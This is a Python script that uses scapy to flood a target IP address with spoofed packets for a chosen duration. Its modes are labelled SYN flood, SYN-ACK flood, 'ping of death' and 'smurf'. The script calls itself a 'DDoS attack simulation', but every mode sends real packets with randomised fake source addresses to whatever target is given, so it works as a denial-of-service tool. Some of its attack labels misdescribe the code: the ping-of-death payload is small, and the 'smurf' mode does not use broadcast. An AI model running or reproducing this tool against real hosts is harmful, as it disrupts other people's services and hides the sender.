import argparse
import random
import time
from scapy.all import *
from scapy.layers.inet import IP, TCP, ICMP

# Function to generate a random IP address
def generate_random_ip():
    return ".".join(str(random.randint(1, 223)) for _ in range(4))

# Function to simulate a DDoS attack
def ddos(target_ip, attack_type, duration):
    target_port = 12345  # Port to target
    start_time = time.time()  # Record the start time

    # Loop for the specified duration to send packets
    while time.time() - start_time < duration:
        src_ip = generate_random_ip()  # Generate a random source IP

        # Different attack types are handled based on the attack type specified
        if attack_type == "syn_flood":
            src_port = random.randint(1024, 65535)  # Random source port
            pkt = IP(src=src_ip, dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="S")
            send(pkt, verbose=0)  # Send SYN packet
        elif attack_type == "pod":
            load = 'X ' * 500  # Payload for Ping of Death
            pkt = IP(src=src_ip, dst=target_ip) / ICMP() / Raw(load=load)
            send(pkt, verbose=0)  # Send ICMP packet with large payload
        elif attack_type == "syn_ack":
            src_port = random.randint(1024, 65535)  # Random source port
            pkt = IP(src=src_ip, dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="SA")
            send(pkt, verbose=0)  # Send SYN-ACK packet
        elif attack_type == "smurf":
            pkt = IP(src=target_ip, dst=target_ip) / ICMP()  # Smurf attack (broadcast)
            send(pkt, verbose=0)  # Send ICMP packet
        else:
            print("Unknown attack type specified.")  # Error for unknown attack types
            break

    print(f"Attack {attack_type} on {target_ip} completed.")  # Notify completion of the attack

# Main execution block
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="DDoS attack simulation")
    parser.add_argument("target_ip", help="Target IP address")  # Target IP address argument
    parser.add_argument("attack_type", help="Type of attack (syn_flood, pod, syn_ack, smurf)")  # Attack type argument
    parser.add_argument("duration", type=float, help="Duration of the attack in seconds (can be a decimal)")  # Duration argument

    args = parser.parse_args()  # Parse command line arguments

    ddos(args.target_ip, args.attack_type, args.duration)  # Execute DDoS attack simulation
